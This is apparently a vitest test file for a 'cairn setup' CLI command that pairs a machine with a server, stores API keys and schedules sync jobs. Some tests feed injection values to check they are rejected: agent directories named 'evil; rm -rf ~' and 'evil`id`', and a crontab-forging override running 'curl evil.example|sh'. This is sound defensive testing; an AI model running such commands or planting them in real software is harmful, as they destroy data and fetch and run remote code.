import { afterEach, describe, expect, it } from 'vitest'
import { createServer, type Server } from 'node:http'
import { mkdtemp, readFile, rm, stat } from 'node:fs/promises'
import { existsSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { spawn } from 'node:child_process'

/**
 * `cairn setup` (CAIRN-314): one command that connects a machine to a Cairn
 * instance and installs everything the four scripts used to do by hand. This
 * exercises the CLI half against a fake server that speaks the pairing
 * contract exactly (connect / connect/poll / health / people), never the
 * real GitHub download — CAIRN_SETUP_SOURCE points at this checkout instead,
 * which is also what makes the test hermetic and fast.
 *
 * Every non-dry-run case passes --no-hooks --no-jobs: install-cron.mjs's
 * --install runs real `launchctl` on macOS, and this suite must never touch
 * this machine for real. --dry-run cases need neither flag, because a dry
 * run never installs anything to begin with.
 */

const REPO = process.cwd()
const CLI = join(REPO, 'cli', 'cairn.mjs')

const servers: Server[] = []
const homes: string[] = []

afterEach(async () => {
  await Promise.all(servers.splice(0).map((s) => new Promise((done) => s.close(done))))
  await Promise.all(homes.splice(0).map((h) => rm(h, { recursive: true, force: true })))
})

type ConnectState = {
  status?: 'pending' | 'denied' | 'expired' | 'approved'
  pendingCount?: number
  expiresIn?: number
  interval?: number
  keys?: { agentName: string; key: string }[]
  user?: { name?: string; email?: string }
  no404?: boolean
  /** Poll answers `denied` for a pairing that asked for any of these. */
  denyRuntimes?: string[]
  /** Every POST /connect body the CLI sent, in order. */
  requests?: { runtimes: string[]; host: string }[]
}

/** A fake Cairn server: health, people (key validity), connect, connect/poll. */
const serve = (state: ConnectState = {}) =>
  new Promise<string>((resolve) => {
    let polls = 0
    const asked = new Map<string, string[]>()
    const server = createServer((req, res) => {
      let raw = ''
      req.on('data', (c) => { raw += c })
      req.on('end', () => {
        const json = (data: unknown, code = 200) => {
          res.writeHead(code, { 'content-type': 'application/json' })
          res.end(JSON.stringify({ success: code < 400, data }))
        }
        if (req.url === '/api/v1/health') return json({ version: '0.10.1', build: 'test' })
        if (req.url === '/api/v1/people') {
          const auth = req.headers.authorization ?? ''
          return auth === 'Bearer sk_valid' ? json([]) : json(null, 401)
        }
        if (req.url === '/api/v1/connect') {
          if (state.status === undefined && state.no404) {
            res.writeHead(404, { 'content-type': 'application/json' })
            return res.end(JSON.stringify({ success: false, error: 'not found' }))
          }
          const body = JSON.parse(raw || '{}')
          state.requests?.push(body)
          const deviceCode = `device-${asked.size + 1}`
          asked.set(deviceCode, body.runtimes ?? [])
          return json({
            deviceCode,
            userCode: 'AB12-CD34',
            verificationUrl: 'http://127.0.0.1/connect/AB12-CD34',
            expiresIn: state.expiresIn ?? 60,
            interval: state.interval ?? 0,
          })
        }
        if (req.url === '/api/v1/connect/poll') {
          polls += 1
          const runtimes = asked.get(JSON.parse(raw || '{}').deviceCode) ?? []
          if (state.denyRuntimes?.some((r) => runtimes.includes(r))) return json({ status: 'denied' })
          if (state.status === 'pending' && polls <= (state.pendingCount ?? 1)) return json({ status: 'pending' })
          if (state.status === 'denied') return json({ status: 'denied' })
          if (state.status === 'expired') return json({ status: 'expired' })
          return json({ status: 'approved', user: state.user ?? { name: 'Julien' }, keys: state.keys ?? [] })
        }
        json({ error: 'unhandled' }, 404)
      })
    })
    servers.push(server)
    server.listen(0, '127.0.0.1', () => resolve(`http://127.0.0.1:${(server.address() as { port: number }).port}`))
  })

const home = async () => {
  const dir = await mkdtemp(join(tmpdir(), 'cairn-setup-'))
  homes.push(dir)
  return dir
}

const RUNTIME_MARKERS = /^(CLAUDECODE|CLAUDE_CODE_|CODEX_|OPENCLAW_|CAIRN_AGENT$|CAIRN_SESSION_ID$)/

const run = (args: string[], HOME: string, extraEnv: Record<string, string> = {}) => {
  const env = { ...process.env }
  for (const name of Object.keys(env)) if (RUNTIME_MARKERS.test(name)) delete env[name]
  return new Promise<{ code: number | null; stdout: string; stderr: string }>((resolve, reject) => {
    const child = spawn('node', [CLI, ...args], {
      env: { ...env, HOME, CAIRN_SETUP_SOURCE: REPO, ...extraEnv },
      stdio: ['ignore', 'pipe', 'pipe'],
    })
    let stdout = ''
    let stderr = ''
    child.stdout.on('data', (d) => { stdout += d })
    child.stderr.on('data', (d) => { stderr += d })
    child.on('error', reject)
    child.on('close', (code) => resolve({ code, stdout, stderr }))
  })
}

describe('cairn setup — dry run', () => {
  it('prints the plan and writes nothing', async () => {
    const base = await serve()
    const HOME = await home()
    const { code, stdout } = await run(['setup', '--url', base, '--runtimes', 'claude-code', '--dry-run'], HOME)
    expect(code).toBe(0)
    expect(stdout).toContain('would write CAIRN_BASE_URL')
    expect(stdout).toContain(`✓ server    ${base}`)
    expect(stdout).toContain('would be paired (--dry-run: skipped)')
    expect(existsSync(join(HOME, '.cairn', 'env'))).toBe(false)
    expect(existsSync(join(HOME, '.local', 'bin', 'cairn'))).toBe(false)
  })

  it('offers OpenClaw only where this account runs its gateway', async () => {
    const base = await serve()
    const { mkdir, writeFile } = await import('node:fs/promises')
    const plan = async (config: unknown) => {
      const HOME = await home()
      await mkdir(join(HOME, '.claude'), { recursive: true })
      await mkdir(join(HOME, '.openclaw'), { recursive: true })
      await writeFile(join(HOME, '.openclaw', 'openclaw.json'), JSON.stringify(config))
      return (await run(['setup', '--url', base, '--dry-run'], HOME)).stdout
    }
    // A client config only reaches someone else's gateway.
    expect(await plan({ gateway: { auth: { token: 'x' } } })).toContain('! keys      claude-code would be paired')
    expect(await plan({ gateway: { port: 18789 } })).toContain('claude-code, openclaw would be paired')
  })

  it('stops with a clear error against an unreachable url', async () => {
    const HOME = await home()
    const { code, stdout, stderr } = await run(
      ['setup', '--url', 'http://127.0.0.1:1', '--runtimes', 'claude-code', '--dry-run'],
      HOME,
    )
    expect(code).not.toBe(0)
    expect(stdout + stderr).toContain('cannot reach http://127.0.0.1:1/api/v1/health')
  })
})

/**
 * CAIRN-316: OpenClaw has no session-end event, so `openclaw-sessions`
 * (scripts/install-cron.mjs) is the only thing that ever records its
 * transcripts — `cairn setup` installs it for you wherever it can work out
 * the sessions directory. Dry-run only here: --install would run real
 * launchctl, which this suite must never do.
 */
describe('cairn setup — openclaw-sessions job', () => {
  it('includes openclaw-sessions with the derived directory when it can find one', async () => {
    const base = await serve()
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    const sessions = join(HOME, '.openclaw', 'agents', 'main', 'agent', 'codex-home', 'sessions')
    await mkdir(sessions, { recursive: true })
    await mkdir(join(HOME, '.cairn', 'hooks'), { recursive: true })
    await writeFile(join(HOME, '.cairn', 'hooks', 'cairn-session-end.mjs'), '// stub\n')

    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
    expect(stdout).toContain(sessions)
  })

  it('skips openclaw-sessions with a clear line when no sessions directory can be found', async () => {
    const base = await serve()
    const HOME = await home()
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('! jobs      openclaw-sessions skipped')
    expect(stdout).toContain('set CAIRN_OPENCLAW_SESSIONS=<dir> and re-run')
    expect(stdout).toContain('CAIRN_OPENCLAW_SESSIONS=')
    expect(stdout).not.toContain('agent-files, openclaw-sessions')
  })

  it('honours an already-set CAIRN_OPENCLAW_SESSIONS instead of deriving one', async () => {
    const base = await serve()
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    const custom = join(HOME, 'custom-sessions')
    await mkdir(custom, { recursive: true })
    await mkdir(join(HOME, '.cairn', 'hooks'), { recursive: true })
    await writeFile(join(HOME, '.cairn', 'hooks', 'cairn-session-end.mjs'), '// stub\n')

    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
      HOME,
      { CAIRN_OPENCLAW_SESSIONS: custom },
    )
    expect(code).toBe(0)
    expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
    expect(stdout).toContain(custom)
  })

  /**
   * F2: an agent name under ~/.openclaw/agents/ is never typed by a person —
   * it is whatever that directory happens to be named — and it used to flow
   * straight into a path this file hands to install-cron.mjs, which renders
   * it into a crontab line. A name is not a thing this file can control, so
   * it is checked against a plain allowlist before it is trusted at all.
   */
  it('ignores an agent name that is not plain letters, digits, dots, dashes or underscores', async () => {
    const base = await serve()
    const HOME = await home()
    const { mkdir } = await import('node:fs/promises')
    // Not `main`: an unsafe name must be ignored even when it would otherwise
    // be the one candidate, not merely lose a tie to a safe `main`.
    await mkdir(join(HOME, '.openclaw', 'agents', 'evil; rm -rf ~', 'agent', 'codex-home', 'sessions'), { recursive: true })

    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('! jobs      openclaw-sessions skipped')
    expect(stdout).toContain('ignored 1 agent name(s)')
    expect(stdout).not.toContain('evil; rm -rf ~')
  })

  it('picks the one safely-named agent over an unsafely-named one with sessions too', async () => {
    const base = await serve()
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    const sessions = join(HOME, '.openclaw', 'agents', 'work-agent.1', 'agent', 'codex-home', 'sessions')
    await mkdir(sessions, { recursive: true })
    await mkdir(join(HOME, '.openclaw', 'agents', 'evil`id`', 'agent', 'codex-home', 'sessions'), { recursive: true })
    await mkdir(join(HOME, '.cairn', 'hooks'), { recursive: true })
    await writeFile(join(HOME, '.cairn', 'hooks', 'cairn-session-end.mjs'), '// stub\n')

    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('jobs      agent-files, openclaw-sessions (plan)')
    expect(stdout).toContain(sessions)
  })

  /**
   * F2: the operator-set override is a plain env var, so nothing stops it
   * from carrying a `%` (cron's own newline escape, crontab(5)) or an actual
   * newline before it ever reaches install-cron.mjs's rendering.
   */
  it('refuses a CAIRN_OPENCLAW_SESSIONS override that could forge a crontab line', async () => {
    const base = await serve()
    const HOME = await home()
    const { code, stdout, stderr } = await run(
      ['setup', '--url', base, '--runtimes', 'openclaw', '--no-hooks', '--dry-run'],
      HOME,
      { CAIRN_OPENCLAW_SESSIONS: '/tmp/x%* * * * * curl evil.example|sh' },
    )
    expect(code).toBe(0) // setup itself still finishes; the failing sub-step is reported, not fatal
    expect(`${stdout}${stderr}`).toContain('CAIRN_OPENCLAW_SESSIONS contains a newline, carriage return or %')
  })
})

describe('cairn setup — pairing', () => {
  it('pairs, prints who approved it, and writes the key at mode 600', async () => {
    const base = await serve({ status: 'pending', pendingCount: 1, keys: [{ agentName: 'claude-code', key: 'sk_new' }], user: { name: 'Julien' } })
    const HOME = await home()
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('Open this link to connect this machine')
    expect(stdout).toContain('AB12-CD34')
    expect(stdout).toContain('✓ approved by Julien')

    const envPath = join(HOME, '.cairn', 'env')
    const content = await readFile(envPath, 'utf8')
    expect(content).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_new')
    const mode = (await stat(envPath)).mode & 0o777
    expect(mode).toBe(0o600)
  })

  it('reports a denial and exits non-zero', async () => {
    const base = await serve({ status: 'denied' })
    const HOME = await home()
    const { code, stdout, stderr } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).not.toBe(0)
    expect(stdout + stderr).toContain('denied')
  })

  it('reports expiry and exits non-zero', async () => {
    const base = await serve({ status: 'expired', expiresIn: 0 })
    const HOME = await home()
    const { code, stdout, stderr } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).not.toBe(0)
    expect(stdout + stderr).toContain('expired')
  })

  it('falls back with a clear message on a server that predates pairing (404)', async () => {
    const base = await serve({ no404: true })
    const HOME = await home()
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('this server predates pairing')
    expect(stdout).toContain(`${base}/users`)
    expect(stdout).toContain('CAIRN_API_KEY_CLAUDE_CODE=')
    // It continues with the rest of setup rather than stopping dead.
    expect(existsSync(join(HOME, '.local', 'bin', 'cairn'))).toBe(true)
  })

  it('tightens an env file that already existed with looser permissions', async () => {
    const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_new' }] })
    const HOME = await home()
    const { mkdir, writeFile, chmod } = await import('node:fs/promises')
    await mkdir(join(HOME, '.cairn'), { recursive: true })
    const envPath = join(HOME, '.cairn', 'env')
    await writeFile(envPath, `CAIRN_BASE_URL=${base}\n`)
    await chmod(envPath, 0o644)
    const { code } = await run(['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'], HOME)
    expect(code).toBe(0)
    expect((await stat(envPath)).mode & 0o777).toBe(0o600)
    expect((await stat(join(HOME, '.cairn'))).mode & 0o777).toBe(0o700)
  })

  it('pairs a maintenance key on its own, so a member still gets their agents\' keys', async () => {
    const requests: { runtimes: string[]; host: string }[] = []
    const base = await serve({
      status: 'approved',
      keys: [{ agentName: 'claude-code', key: 'sk_member' }],
      denyRuntimes: ['maintenance'],
      requests,
    })
    const HOME = await home()
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--maintenance', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(requests.map((r) => r.runtimes)).toEqual([['claude-code'], ['maintenance']])
    expect(requests[0]!.host).toMatch(/^[A-Za-z0-9._-]+$/)
    expect(stdout).toContain('maintenance not issued')
    expect(await readFile(join(HOME, '.cairn', 'env'), 'utf8')).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_member')
  })

  it('replaces a stale key in place rather than duplicating the line', async () => {
    const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_fresh' }] })
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
    await writeFile(
      join(HOME, '.cairn', 'env'),
      `CAIRN_BASE_URL=${base}\n# a comment, kept\nCAIRN_API_KEY_CLAUDE_CODE=sk_stale\n`,
      { mode: 0o600 },
    )
    const { code } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    const content = await readFile(join(HOME, '.cairn', 'env'), 'utf8')
    expect(content.match(/CAIRN_API_KEY_CLAUDE_CODE=/g)).toHaveLength(1)
    expect(content).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_fresh')
    expect(content).not.toContain('sk_stale')
    expect(content).toContain('# a comment, kept')
  })

  it('keeps a key that still authenticates, without re-pairing', async () => {
    const base = await serve()
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
    await writeFile(
      join(HOME, '.cairn', 'env'),
      `CAIRN_BASE_URL=${base}\nCAIRN_API_KEY_CLAUDE_CODE=sk_valid\n`,
      { mode: 0o600 },
    )
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('claude-code already set, and still work')
    expect(stdout).not.toContain('Open this link to connect this machine')
  })
})

describe('cairn setup — idempotent re-run', () => {
  it('a second run keeps the key and reports the cli/skill as unchanged', async () => {
    const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_valid' }] })
    const HOME = await home()
    const first = await run(['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'], HOME)
    expect(first.code).toBe(0)

    // The fake server's /people only accepts sk_valid, so the key just
    // written passes the second run's validity check.
    const second = await run(['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'], HOME)
    expect(second.code).toBe(0)
    expect(second.stdout).toContain('claude-code already set, and still work')
    expect(second.stdout).toContain('cli') // unchanged line still names the step
    expect(second.stdout).toContain('unchanged')

    const content = await readFile(join(HOME, '.cairn', 'env'), 'utf8')
    expect(content.match(/CAIRN_API_KEY_CLAUDE_CODE=/g)).toHaveLength(1)
  })
})

describe('cairn setup — multi-instance naming', () => {
  it('derives a name from the url, skipping generic host labels', async () => {
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
    await writeFile(join(HOME, '.cairn', 'env'), 'CAIRN_BASE_URL=https://old.example.com\n', { mode: 0o600 })

    const base = await serve()
    // The fake server is on 127.0.0.1:<port>, which has no meaningful labels
    // to skip, so it derives to its own first label; the point of this case
    // is that a *different* url than the one on disk triggers multi-instance
    // mode and registers a name rather than overwriting ~/.cairn/env.
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--dry-run'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('would register')
    expect(existsSync(join(HOME, '.cairn', 'instances.json'))).toBe(false) // dry-run changed nothing
    const untouched = await readFile(join(HOME, '.cairn', 'env'), 'utf8')
    expect(untouched).toContain('old.example.com')
  })

  it('adopts the existing single instance before adding a second, so the first keeps working', async () => {
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
    await writeFile(
      join(HOME, '.cairn', 'env'),
      'CAIRN_BASE_URL=https://tasks.example.com\nCAIRN_API_KEY_CLAUDE_CODE=sk_first\n',
      { mode: 0o600 },
    )
    const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_second' }] })
    const { code, stdout } = await run(
      ['setup', '--url', base, '--name', 'work', '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('adopted from ~/.cairn/env, still the default')

    const config = JSON.parse(await readFile(join(HOME, '.cairn', 'instances.json'), 'utf8'))
    expect(Object.keys(config.instances).sort()).toEqual(['tasks', 'work'])
    expect(config.instances.tasks.url).toBe('https://tasks.example.com')
    expect(config.unclassified).toEqual({ mode: 'default', instance: 'tasks' })
    expect(await readFile(join(HOME, '.cairn', 'instances', 'tasks', 'env'), 'utf8')).toContain('sk_first')
    expect(await readFile(join(HOME, '.cairn', 'instances', 'work', 'env'), 'utf8')).toContain('sk_second')
  })

  it('--name overrides the derived name', async () => {
    const HOME = await home()
    const { mkdir, writeFile } = await import('node:fs/promises')
    await mkdir(join(HOME, '.cairn'), { recursive: true, mode: 0o700 })
    await writeFile(join(HOME, '.cairn', 'env'), 'CAIRN_BASE_URL=https://old.example.com\n', { mode: 0o600 })

    const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_new' }] })
    const { code, stdout } = await run(
      ['setup', '--url', base, '--name', 'work', '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain('work ->')
    const instances = JSON.parse(await readFile(join(HOME, '.cairn', 'instances.json'), 'utf8'))
    expect(instances.instances.work.url).toBe(base)
    const envPath = join(HOME, '.cairn', 'instances', 'work', 'env')
    expect(existsSync(envPath)).toBe(true)
    const content = await readFile(envPath, 'utf8')
    expect(content).toContain('CAIRN_API_KEY_CLAUDE_CODE=sk_new')
  })
})

describe('cairn setup — CAIRN_SETUP_SOURCE', () => {
  it('installs the cli and skill straight from the local checkout, no download attempted', async () => {
    const base = await serve({ status: 'approved', keys: [{ agentName: 'claude-code', key: 'sk_new' }] })
    const HOME = await home()
    const { code, stdout } = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--no-jobs'],
      HOME,
    )
    expect(code).toBe(0)
    expect(stdout).toContain(`${REPO} (CAIRN_SETUP_SOURCE)`)
    const installed = await readFile(join(HOME, '.local', 'bin', 'cairn'), 'utf8')
    const source = await readFile(CLI, 'utf8')
    expect(installed).toBe(source)
    expect(existsSync(join(HOME, '.claude', 'skills', 'cairn', 'SKILL.md'))).toBe(true)
    // No release was fetched from GitHub or cached under ~/.cairn/releases.
    expect(existsSync(join(HOME, '.cairn', 'releases'))).toBe(false)
  })
})

/**
 * Issue #110: a machine set up from a checkout (a private mirror, say) used to
 * be scheduled to sync from the public `main` regardless. The plan is what
 * install-cron would render — printed, never installed, because --install
 * would run real launchctl here.
 */
describe('cairn setup — the agent-files job', () => {
  const planned = async (extraEnv: Record<string, string> = {}) => {
    const base = await serve()
    const HOME = await home()
    const { writeFile } = await import('node:fs/promises')
    const script = join(HOME, 'sync.mjs')
    await writeFile(script, '')
    const result = await run(
      ['setup', '--url', base, '--runtimes', 'claude-code', '--no-hooks', '--dry-run'],
      HOME,
      { CAIRN_SYNC_SCRIPT: script, CAIRN_NODE_PATH: process.execPath, CAIRN_LOG_DIR: HOME, ...extraEnv },
    )
    // One shape for both backends: plist <string>s and crontab quotes alike.
    const words = result.stdout.replace(/<\/?string>/g, ' ').replace(/'/g, ' ').replace(/\s+/g, ' ')
    return { ...result, words, base }
  }

  it('schedules the CAIRN_SETUP_SOURCE checkout, and the runtimes it was given', async () => {
    const { code, words } = await planned()
    expect(code).toBe(0)
    expect(words).toContain(`--source ${REPO} --runtimes claude-code`)
    expect(words).not.toContain('raw.githubusercontent.com')
  })

  it('says what the job overwrites, how often, from where, and how to skip it', async () => {
    const { stdout } = await planned()
    expect(stdout).toContain('agent-files keeps ~/.local/bin/cairn, ~/.cairn/hooks and the skill')
    expect(stdout).toContain(`${REPO} (CAIRN_SETUP_SOURCE)`)
    expect(stdout).toMatch(/every 15 minutes and at login|hourly/)
    expect(stdout).toContain('--no-jobs skips it')
  })

  it('refuses a CAIRN_REPO that is not <owner>/<name>', async () => {
    const { code, stderr } = await planned({ CAIRN_REPO: 'acme/../evil' })
    expect(code).not.toBe(0)
    expect(stderr).toContain('is not <owner>/<name>')
  })
})
